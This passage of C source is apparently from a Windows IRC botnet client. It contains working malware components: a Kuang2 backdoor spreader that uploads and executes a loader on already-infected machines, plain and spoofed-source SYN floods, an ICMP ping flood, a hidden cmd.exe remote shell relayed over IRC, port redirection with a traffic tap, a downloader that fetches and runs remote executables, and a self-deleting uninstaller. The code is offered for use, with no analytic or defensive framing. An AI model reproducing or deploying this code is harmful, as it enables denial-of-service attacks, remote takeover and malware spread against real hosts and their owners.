			if (SUB7_Reciev(sock) == -1) 
				break;
			err = recv(sock, rBuffer, sizeof(rBuffer), 0);
		}
		closesocket(sock);
		return 1;
			
	}
	else if (try == 1) {
		closesocket(sock);
		Sleep(2000);
		if ((sock = create_sock(host,port)) == SOCKET_ERROR) goto end;
		goto restart;
	}

	end:;
	closesocket(sock);
	return 0;

}
#endif

#ifdef KUANG2_SPREADER
#define	K2_UPLOAD_FILE	0x46445055
#define	K2_ERROR	0x52525245
#define	K2_DONE		0x454E4F44
#define	K2_RUN_FILE	0x464E5552
#define	K2_QUIT		0x54495551	
typedef struct {
	unsigned int command;
	union {
		char bdata[1024-4];
		struct {
			unsigned int param;
			char sdata[1024-8];
		};
	};
} Message, *pMessage;
char k2_buffer[1024];
pMessage k2_msg = (pMessage) k2_buffer;

int KUANG_Reciev(SOCKET sock)
{
	char rBuffer[1024];
	TIMEVAL time;
   	fd_set fd_struct;
    	time.tv_sec = 30;//timeout after 60 sec.
    	time.tv_usec = 0;
   	FD_ZERO(&fd_struct);
    	FD_SET(sock, &fd_struct);
	if (select(0, &fd_struct, NULL, NULL, &time) <= 0)
	{
		closesocket(sock); 
		return -1;
	}
	memset(k2_buffer,0,sizeof(k2_buffer));
      	if (recv(sock, k2_buffer, sizeof(k2_buffer), 0) < 1) return -1;
	if (k2_msg->command == K2_ERROR) {
		return -1;
	}
      	      
	return 0;
}

int KUANG(SOCKET sock)
{
	char rBuffer[1024];
	unsigned int Fsize, Fsend, move;
	DWORD mode = 0;
	int err,x;
	char randFile[5];
	char rFile[15];
	memset(rFile,0,sizeof(rFile));
	memset(randFile,0,sizeof(randFile));
	srand(GetTickCount());
	for (x=0;x<4;x++)
		randFile[x] = (rand()%26)+97;
	randFile[x+1] = '\0';
	sprintf(rFile,"c:\\%s.exe",randFile);
	ioctlsocket(sock,FIONBIO,&mode); //set the socket back to blocking
	if (KUANG_Reciev(sock) == -1) goto end;
	memset(k2_buffer,0,sizeof(k2_buffer));
	HANDLE testfile = CreateFile(loader,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE) 
		goto end;
	Fsize = GetFileSize(testfile,NULL);
	k2_msg->command=K2_UPLOAD_FILE;
	k2_msg->param=Fsize;
	strcpy(k2_msg->sdata,rFile);
	//strcpy(k2_msg->bdata,rFile);
	//CloseHandle(testfile);
	send(sock,k2_buffer,1024, 0);
	if (KUANG_Reciev(sock) == -1) goto end;
	while (Fsize) {
		int Fsend = 1024;
		memset(rBuffer,0,sizeof(rBuffer));
		if (Fsend>Fsize) Fsend=Fsize;
		move = 0-Fsize;
		SetFilePointer(testfile, move, NULL, FILE_END);
		ReadFile(testfile, rBuffer, Fsend, &mode, NULL);
		int bytes_sent = send(sock, rBuffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (WSAGetLastError() != WSAEWOULDBLOCK) break;
			else bytes_sent = 0;
		}
		Fsize = Fsize - bytes_sent;
	}
	if (KUANG_Reciev(sock) == -1) goto end;
	if (testfile != INVALID_HANDLE_VALUE) CloseHandle(testfile);
	memset(k2_buffer,0,sizeof(k2_buffer));
	k2_msg->command=K2_RUN_FILE;
	sprintf(k2_msg->bdata,rFile);
	send(sock,k2_buffer ,1024, 0);
	if (KUANG_Reciev(sock) == -1) goto end;
	memset(k2_buffer,0,sizeof(k2_buffer));
	k2_msg->command=K2_QUIT;
	send(sock,k2_buffer ,4, 0);
	return 1;
	end:;
	closesocket(sock);
	return 0;
}
#endif


#ifdef SYN_FLOOD
#define MAX_SYNFLOOD_SOCKETS_TO_USE 200
DWORD WINAPI syn_flood(LPVOID param)
{
	int num = (int)param;
	syn[num].state = 1;
	SOCKADDR_IN    SockAddr;
   	SOCKET         sock[MAX_SYNFLOOD_SOCKETS_TO_USE];//we are gone use 200 sockets
   	IN_ADDR iaddr;
	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(syn[num].port);
	LPHOSTENT lpHostEntry = NULL;
 	DWORD mode = 1;
	int c,i;
	iaddr.s_addr = inet_addr(syn[num].host);
	if (iaddr.s_addr == INADDR_NONE) lpHostEntry = gethostbyname(syn[num].host);
	if (lpHostEntry == NULL && iaddr.s_addr == INADDR_NONE) { //error dns
		syn[num].state = 0;
		threads[syn[num].thread].id = 0;	
		return 0;
	}
	if (lpHostEntry != NULL)
		SockAddr.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list); //hostname
	else
		SockAddr.sin_addr = iaddr; //ip address
	i = 0;
	while (i < syn[num].times) {
		for (c=0;c<MAX_SYNFLOOD_SOCKETS_TO_USE;c++)
		{
			sock[c] = socket(AF_INET, SOCK_STREAM, 0);
   			if (sock[c] == INVALID_SOCKET)
      				continue;
			ioctlsocket(sock[c],FIONBIO,&mode);
		}
		for (c=0;c<MAX_SYNFLOOD_SOCKETS_TO_USE;c++)
  			connect(sock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
      		Sleep(syn[num].delay);     
		for (c=0;c<MAX_SYNFLOOD_SOCKETS_TO_USE;c++)
			closesocket(sock[c]); //close all sockets
		i++;
	}
	syn[num].state = 0;
	threads[syn[num].thread].id = 0;	
	return 0;
}
#endif

#ifdef remote_cmd
void Close_Handles()
{
	if (pipe_read != INVALID_HANDLE_VALUE) CloseHandle(pipe_read);
	if (pipe_write != INVALID_HANDLE_VALUE) CloseHandle(pipe_write);
	if (pipe_Hproc != INVALID_HANDLE_VALUE) CloseHandle(pipe_Hproc);
}


int open_cmd(SOCKET sock,char * chan)
{
	Close_Handles();
	char searsdir[MAX_PATH];
  	SECURITY_ATTRIBUTES secAttr;
  	STARTUPINFO startInfo;
  	PROCESS_INFORMATION procInfo;
	HANDLE hChildOutRd, hChildOutWr, hChildInRd, hChildInWr;
	//sears for cmd.exe
	GetWindowsDirectory(searsdir,sizeof(searsdir));
	strcat(searsdir,"\\cmd.exe");
	if (GetFileAttributes(searsdir) == 0xFFFFFFFF) {
		GetSystemDirectory(searsdir,sizeof(searsdir));
		strcat(searsdir,"\\cmd.exe");
		if (GetFileAttributes(searsdir) == 0xFFFFFFFF) return -1;
	}
    	secAttr.nLength = sizeof(secAttr);
    	secAttr.bInheritHandle = TRUE;
    	secAttr.lpSecurityDescriptor = NULL;

    	if (!CreatePipe(&hChildOutRd, &hChildOutWr, &secAttr, 0)) return -1;
    	if (!CreatePipe(&hChildInRd, &hChildInWr, &secAttr, 0)) return -1;
    	if (!DuplicateHandle(GetCurrentProcess(), hChildInWr, GetCurrentProcess(), &hChildInWrDupe, 0, FALSE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE)) return -1;

   	memset(&startInfo, 0, sizeof(startInfo));
   	startInfo.cb = sizeof(startInfo);
    	startInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    	startInfo.wShowWindow = SW_HIDE;
    	startInfo.hStdInput = hChildInRd;
    	startInfo.hStdOutput = hChildOutWr;
   	if (!CreateProcess(searsdir,"", NULL, NULL, TRUE, 0, NULL, NULL, &startInfo, &procInfo)) 
		return -1;
   	CloseHandle(hChildInRd);
	DWORD id;
	pipe_read = hChildOutRd;
	pipe_write = hChildInWr;
	pipe_Hproc = procInfo.hProcess;
   	CloseHandle(procInfo.hThread);
	pipesock = sock;
	if (chan) sprintf(pipe_chan,chan);
	else sprintf(pipe_chan,"\0");
	CreateThread(NULL, 0, &PipeReadThread, NULL, 0, &id);
        return 0;
}




DWORD WINAPI PipeReadThread(LPVOID param)
{
	DWORD numread, br;
	char buffer[512];
	while (1)
	{
		BOOL eol = FALSE;
		DWORD State;

		memset(buffer,0,sizeof(buffer));
		if (!PeekNamedPipe(pipe_read,buffer,512,&br,NULL,NULL)) {
			pipe_send(pipesock,pipe_chan,"Could not read data from proccess");
			return 0;
		}

		if (br == 0) { //nothing to read 
			if (GetExitCodeProcess(pipe_Hproc,&State)) { //maybe process is death ?
				if (State != STILL_ACTIVE) {
					Close_Handles(); 
					pipe_send(pipesock,pipe_chan,"Proccess has terminated");
					return 0;
				}
			}
			Sleep(10); //process is waithing sleep and try again
			continue;
		}
		DWORD cbyte;
		for(cbyte=0;cbyte<br;cbyte++) {
			if (buffer[cbyte] == '\n')
			{
				eol = TRUE;
				break;
			}
		}
		if (eol) br = cbyte + 1;
		else br = 512;
		memset(buffer,0,sizeof(buffer));
		if (!ReadFile(pipe_read, buffer, br, &numread, NULL)) 
				break;
		pipe_send(pipesock,pipe_chan,buffer);

	}
	pipe_send(pipesock,pipe_chan,"Could not read data from proccess");
        return 0;
}
int pipe_send(SOCKET sock,char *chan,char *buf)
{
	char sendbuf[612];
	if (strlen(chan) > 2) sprintf(sendbuf,"PRIVMSG %s :%s\r",chan,buf);
	else sprintf(sendbuf,"%s",buf);
	if (send(sock,sendbuf,strlen(sendbuf),0) <= 0) Close_Handles();
	if (strlen(chan) > 2) Sleep(Flood_delay); //we dont want a excess flood
	return 0;
}
#endif
SOCKET create_sock(char *host, int port)
{
	DWORD err;
        LPHOSTENT lpHostEntry = NULL;
   	SOCKADDR_IN  SockAddr;
   	SOCKET sock;
   	IN_ADDR iaddr;
   	if ((sock = socket( AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
      		return -1;
	memset(&SockAddr, 0, sizeof(SockAddr));
   	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(port);
	iaddr.s_addr = inet_addr(host);
	if (iaddr.s_addr == INADDR_NONE)  lpHostEntry = gethostbyname(host); //hostname
	if (lpHostEntry == NULL && iaddr.s_addr == INADDR_NONE)  //error dns
		return -1;
	if (lpHostEntry != NULL)
		SockAddr.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list); //hostname
	else
		SockAddr.sin_addr = iaddr; //ip address
	if (connect(sock, (SOCKADDR *) &SockAddr, sizeof(SockAddr)) == SOCKET_ERROR) {
		closesocket(sock);
		return -1;
	}
	return sock;
}
SOCKET Listen(int port)
{
	SOCKET sock;
	SOCKADDR_IN  SockAddr;
   	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) 
      		return -1;
	memset(&SockAddr, 0, sizeof(SockAddr));
   	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(port);
	SockAddr.sin_addr.s_addr = INADDR_ANY;  
	if (bind(sock, (SOCKADDR *)&SockAddr, sizeof(SockAddr)) != 0) 
		return -1;//port is in use ?
	if (listen(sock, SOMAXCONN) != 0) 
		return -1;
	return sock;
}

int redirect_transfer(SOCKET sock_in,SOCKET sock_out)
{
	char buf[4096];	
	memset(buf, 0, sizeof(buf));
	DWORD err,err2,err3;
	err = recv(sock_in,buf,sizeof(buf),0);
	if (err == 0) return -1;
	if (err == SOCKET_ERROR) {
		if (WSAGetLastError() == WSAEWOULDBLOCK) return 0;
		return -1;
	}
	err2 = send(sock_out,buf,err,0);
	if (redirectspy > 0) {
		if (send(redirectspy,buf,err,0) < 1) redirectspy = 0;
	}
	if (err2 == 0) return -1;
	if (err2 == SOCKET_ERROR) {
		if (WSAGetLastError() == WSAEWOULDBLOCK) return 0;
		return -1;
	}
	return 0;
}
DWORD WINAPI redirect_io(LPVOID param)
{
	int num = (int)param;
	SOCKET sock_out;
	SOCKET sock_in;
	sock_in = redirectsock_in;
	info = TRUE;
	if ((sock_out = create_sock(threads[num].dir,threads[num].port)) == SOCKET_ERROR) {
		closesocket(sock_in);
		return 0;
	}
	unsigned long mode = 1;
	ioctlsocket(sock_out,FIONBIO,&mode);
	ioctlsocket(sock_in,FIONBIO,&mode);
  	fd_set fd_struct;

   	while (1)
   	{
		FD_ZERO(&fd_struct);
      		FD_SET(sock_in, &fd_struct);
     		FD_SET(sock_out, &fd_struct);
      		if (select(0, &fd_struct, NULL, NULL, NULL) == SOCKET_ERROR) 
			break;
      		if (FD_ISSET(sock_in, &fd_struct)) 
      			if (redirect_transfer(sock_in,sock_out) == -1) break;
       		if (FD_ISSET(sock_out,&fd_struct)) 
			if (redirect_transfer(sock_out,sock_in) == -1) break;
   	}
	closesocket(sock_out);
	closesocket(sock_in);
	return 0;
}
DWORD WINAPI port_redirect(LPVOID param)
{
	int num = (int)param;
	SOCKADDR_IN SockAddr;
	int addrlen;
	DWORD id;
	while (1) {
		addrlen = sizeof(SockAddr);
		if ((redirectsock_in = accept(threads[num].sock, (SOCKADDR *)&SockAddr,&addrlen)) == INVALID_SOCKET)  
			break;
		info = FALSE;
		CreateThread(NULL, 0, &redirect_io, (LPVOID)num, 0, &id);
		while (info == FALSE) Sleep(5);
	}
	closesocket(threads[num].sock);
	threads[num].id = 0;
	return 0;
}


#ifdef SPOOFD_SYNFLOOD

DWORD WINAPI Spoofd_syn(LPVOID param)
{
	int num = (int)param;
	char chan[250];
	strcpy(chan,sendtochan);
	WSADATA WSAData; 
	SOCKET sock; 
	Spoofdsyn[num].state = 1;
	SOCKADDR_IN addr_in; 
	IPHEADER ipHeader; 
	TCPHEADER tcpHeader; 
	PSDHEADER psdHeader; 
	char sendbuf[512];
	char szSendBuf[60]={0}; 
	BOOL flag; 
	int rect,nTimeOver; 
	unsigned int SpoofingIP=0; 
	DWORD i=0; 
	int Count;
	Count = 0;


	if (WSAStartup(MAKEWORD(2,2), &WSAData)!=0) 
	{ 
		strcpy(sendbuf,"WSA er");
		goto end; 
	} 

	if ((sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED )) == INVALID_SOCKET) 
	{ 
		strcpy(sendbuf,"I soc");
		goto end;  
	} 
	flag=TRUE; 
	if (setsockopt(sock,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag))==SOCKET_ERROR) 
	{ 
		strcpy(sendbuf,"sockopt er");
		goto end;
	} 


	addr_in.sin_family = AF_INET; 
	addr_in.sin_port = htons(Spoofdsyn[num].port); 
	addr_in.sin_addr.s_addr = Spoofdsyn[num].TargetIP; 


	ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long)); 
	ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader)); 
	ipHeader.ident=1; 
	ipHeader.frag_and_flags=0; 
	ipHeader.ttl=128; 
	ipHeader.proto=IPPROTO_TCP; 
	ipHeader.checksum=0; 
	ipHeader.destIP=Spoofdsyn[num].TargetIP; 
	tcpHeader.th_dport=htons(Spoofdsyn[num].port); 
	tcpHeader.th_ack=0; 
	tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0); 
	tcpHeader.th_flag=2; 
	tcpHeader.th_win=htons(16384); 
	tcpHeader.th_urp=0;  
	char IP[15];
	while(1) 
	{
		i++;
		Sleep(Spoofdsyn[num].delay);
		memset(IP,0,sizeof(IP));
		sprintf(IP,"%i.%i.%i.%i",rand()%255,rand()%255,rand()%255,rand()%255);
 		SpoofingIP=htonl(inet_addr(IP));
		srand(GetTickCount());
		tcpHeader.th_sum=0; // can't be outside the for loop 

		psdHeader.daddr=ipHeader.destIP; 
		psdHeader.mbz=0; 
		psdHeader.ptcl=IPPROTO_TCP; 
		psdHeader.tcpl=htons(sizeof(tcpHeader)); 

		ipHeader.sourceIP=htonl(SpoofingIP);


		tcpHeader.th_sport=htons((rand() % 1001) + 1000 );//htons(SOURCE_PORT); 
		tcpHeader.th_seq=htons((rand() << 16) | rand()); //htonl(0x1234567 ; 

		psdHeader.saddr=ipHeader.sourceIP;
		memset(szSendBuf,0,sizeof(szSendBuf));
		memcpy(szSendBuf, &psdHeader, sizeof(psdHeader)); 
		memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader)); 
		tcpHeader.th_sum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader)); 

		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
		memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 
		memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4); 
		ipHeader.checksum=checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader)); 

		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 

		rect = sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader),0,(struct sockaddr*)&addr_in, sizeof(addr_in)); 
		if (rect==SOCKET_ERROR) 
		{  
			strcpy(sendbuf,"S ER");
			goto end;
		} 

		Count++;
		if (Count > Spoofdsyn[num].times) break;
	} 
	strcpy(sendbuf,"p send");
	end:;
	char buf[512];
	sprintf(buf,"PRIVMSG %s :%s\n",chan,sendbuf);
	send(Spoofdsyn[num].sock,buf,strlen(buf),0);
	Spoofdsyn[num].state = 0;
	threads[Spoofdsyn[num].thread].id = 0;
	return 0; 
} 

#endif

#ifdef WEB_DOWNLOAD
DWORD WINAPI download(LPVOID param)
{
	SOCKET ircsock;
	ircsock = dcchosts;
	char chan[250];
	strcpy(chan,sendtochan);
	int num = (int)param;
	//we need the address of the server..
	//first part of the url should always be http://
	//we could use InternetOpenUrl but why do it easy if we can do it the hard way :D and its a bit better this way
	char host[250];
	char Rfilename[512];
	memset(Rfilename,0,sizeof(Rfilename));
	memset(host,0,sizeof(host));
	char sendbuf[512];
	char buffer[4096];
	char *buffer2;
	int c,d,p,port;
	BOOL useport = FALSE;
	BOOL success = FALSE;
	d=0;
	char tempport[5];
	for (c=7;c<strlen(threads[num].dir);c++,d++)
	{
		if (threads[num].dir[c] == '/') break;
		else if (threads[num].dir[c] == ':') { //not port 80 ?
			p=0;
			useport = TRUE;
		}
		else if (useport) {
			tempport[p] = threads[num].dir[c];
			p++;
		}
		else host[d] = threads[num].dir[c];
	}
	if (useport) { tempport[p] = '\0'; port = atoi(tempport); }
	else port = 80;
	host[d+1] = '\0';
	//next create GET filename string 
	strcpy(Rfilename,"GET ");
	for (d=0;c<strlen(threads[num].dir);c++,d++)
		sendbuf[d] = threads[num].dir[c];
	sendbuf[d+1] = '\0';
	sprintf(Rfilename,"GET %s HTTP/1.1\r\n Accept: */*\r\nAccept-Language: nl\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nHost: %s:%i\r\nConnection: Keep-Alive\r\n\r\n",sendbuf,host,port);

	HANDLE filehandle;

	//now lets make a connection and download the shit 
	if ((threads[num].sock = create_sock(host,port)) < 1) {// could not connect
		sprintf(sendbuf,"Error connecting");
		goto end;
	}
	send(threads[num].sock,Rfilename,strlen(Rfilename),0);
	int size = 0;
	BOOL uninstall = FALSE;
	if (strlen(threads[num].file) < 1) {
		 uninstall = TRUE;
		char tempdir[MAX_PATH]; 
		GetTempPath(sizeof(tempdir), tempdir);
		srand(GetTickCount());
		char rFile[6];
		srand(GetTickCount());
		int x;
		for (x=0;x<4;x++)
			rFile[x] = (rand()%26)+97;
		rFile[x+1] = '\0';
		sprintf(threads[num].file,"%s\\%s.exe",tempdir,rFile);
	}
	filehandle = CreateFile(threads[num].file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
	if (filehandle == INVALID_HANDLE_VALUE) {
		sprintf(sendbuf,"Error creating local file");
		goto end;
	}
	CloseHandle(filehandle);
	FILE *file = NULL;
 	file = fopen(threads[num].file,"wb");
	int i = 0;
 	while(1) {
                memset(buffer,0,sizeof(buffer));
                if ((i = recv(threads[num].sock,buffer,4096,0)) <= 0) {
			sprintf(sendbuf,"Error recieving file");	
			goto end;
		}
                if (i < 4096) buffer[i]=0;
                for (d=0;d<i;d++) {
			if (!strncmp(buffer+d,"\r\n\r\n",4)) {
				size = i-d-4;
                        	for (d+=4;d<i;d++) 
					fputc(buffer[d],file);
				goto done;
                       }
                }
        }
        done:
        while(1) {
		memset(buffer,0,sizeof(buffer));
		i = recv(threads[num].sock,buffer,4096,0);
                if (i == 0) {
			if (uninstall) {
				fclose(file);
				if ((int) ShellExecute(0, "open", threads[num].file, NULL, NULL, SW_SHOW) < 33) {
					sprintf(sendbuf,"error updating");
					break;
				}
				writekeys(TRUE);
			}
			success = TRUE;
			sprintf(sendbuf,"file downloaded to %s size: %i bytes",threads[num].file,size);
			break;
		}
		if (i < 0) { //socket error
			sprintf(sendbuf,"socket error");
			break;
		}
                if (i < 4096) buffer[i]=0;
		size = size+i;
                for (d=0;d<i;d++) 
			fputc(buffer[d],file);  
        }
	end:;
	if (file != NULL) fclose(file);
	if (!success) DeleteFile(threads[num].file);
	if (threads[num].sock > 0) closesocket(threads[num].sock);
	sprintf(buffer,"PRIVMSG %s :%s\n",chan,sendbuf);
	send(ircsock,buffer,strlen(buffer),0);
	threads[num].id = 0;
	return 0;
}
#endif


void uninstall(void)
{
	char batfile[MAX_PATH]; 
	char tempdir[MAX_PATH]; 
	char cfilename[MAX_PATH];
	char tcmdline[MAX_PATH];
	char cmdline[MAX_PATH];
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	GetTempPath(sizeof(tempdir), tempdir);
	sprintf(batfile, "%s\\rs.bat", tempdir);
	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f != INVALID_HANDLE_VALUE) {
		// write a batch file to remove our executable once we close
		WriteFile(f, "@echo off\r\n"
					 ":start\r\nif not exist \"\"%1\"\" goto done\r\n"
					 "del /F \"\"%1\"\"\r\n"
					 "del \"\"%1\"\"\r\n"
					 "goto start\r\n"
					 ":done\r\n"
					 "del /F %temp%\rs.bat\r\n"
					 "del %temp%\r.bat\r\n", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
		sprintf(tcmdline, "%%comspec%% /c %s %s", batfile, cfilename); // build command line
		ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); // put the name of the command interpreter into the command line

		// execute the batch file
		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
	WSACleanup();
	exit(0);
 }


char ping_buff[65500];      // packet buffer
int ping_delay;
typedef unsigned long IPAddr;
typedef struct ip_option_information {
 	unsigned char Ttl;
 	unsigned char Tos;
 	unsigned char Flags;
 	unsigned char OptionsSize;
 	unsigned char FAR *OptionsData;
 } IP_OPTION_INFORMATION, *PIP_OPTION_INFORMATION;
typedef struct icmp_echo_reply {
 	IPAddr Address;
 	unsigned long Status;
 	unsigned long RoundTripTime;
 	unsigned short DataSize;
 	unsigned short Reserved;
 	void FAR *Data;
 	struct ip_option_information Options;
 } ICMP_ECHO_REPLY;
// icmp.dll function variables
 typedef int (__stdcall *ICF)(VOID);
 ICF fIcmpCreateFile;
 typedef int (__stdcall *ISE)(HANDLE, IPAddr, LPVOID, WORD, PIP_OPTION_INFORMATION, LPVOID, DWORD, DWORD);
 ISE fIcmpSendEcho;
 typedef int (__stdcall *ICH)(HANDLE);
 ICH fIcmpCloseHandle;

//  function for sending pings
 DWORD WINAPI ping(LPVOID param)
 {
	int num = (int)param;
	int delay = ping_delay;
	SOCKET sock = dcchosts;
	HINSTANCE icmp_dll = LoadLibrary("ICMP.DLL");
    	if (icmp_dll == 0) goto err;
 	else {
	 	fIcmpCreateFile  = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
 		fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
 		fIcmpSendEcho    = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");
 		if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho) 
	   		goto err;
	}
	HANDLE icmp;
	LPHOSTENT lpHostEntry = NULL;
	SOCKADDR_IN    SockAddr;
	IN_ADDR iaddr;
	IPAddr ip;
	ICMP_ECHO_REPLY reply;
	int i;
	char sendbuf[512];
	

	iaddr.s_addr = inet_addr(threads[num].dir);
	if (iaddr.s_addr == INADDR_NONE)  lpHostEntry = gethostbyname(threads[num].dir); //hostname
	if (lpHostEntry == NULL && iaddr.s_addr == INADDR_NONE)  //error dns
		goto err;
	if (lpHostEntry != NULL)
		ip = *(DWORD*)*lpHostEntry->h_addr_list; //hostname
	else
		ip = iaddr.s_addr; //ip address
	icmp = (HANDLE)fIcmpCreateFile();
	if (icmp == INVALID_HANDLE_VALUE) goto err;
	memset(&reply, 0, sizeof(reply));
	reply.RoundTripTime = 0xffffffff;

  	//if (threads[num].port > 65500) ping.size = 65500;
	//if (ping.delay < 1) ping.delay = 1;
	memset(ping_buff,37,sizeof(ping_buff));
	for (i = 0; i < threads[num].num; i++) {
		fIcmpSendEcho(icmp, ip,ping_buff, threads[num].port, NULL, &reply, sizeof(ICMP_ECHO_REPLY), 1);
		Sleep(delay);
	}

	fIcmpCloseHandle(icmp);
	FreeLibrary(icmp_dll);
	if (strlen(threads[num].file) > 2) sprintf(sendbuf,"PRIVMSG %s :ICMP packets send to %s\n",threads[num].file,threads[num].dir);
	else sprintf(sendbuf,"ICMP packets send to %s\n",threads[num].dir);
	send(sock,sendbuf,strlen(sendbuf),0);
	threads[num].id = 0;
	return 0;
	err:;
	if (strlen(threads[num].file) > 2) sprintf(sendbuf,"PRIVMSG %s :error sending packets to %s\n",threads[num].file,threads[num].dir);
	else sprintf(sendbuf,"error sending packets to %s\n",threads[num].dir);
	send(sock,sendbuf,strlen(sendbuf),0);
	threads[num].id = 0;
	return 0;
 }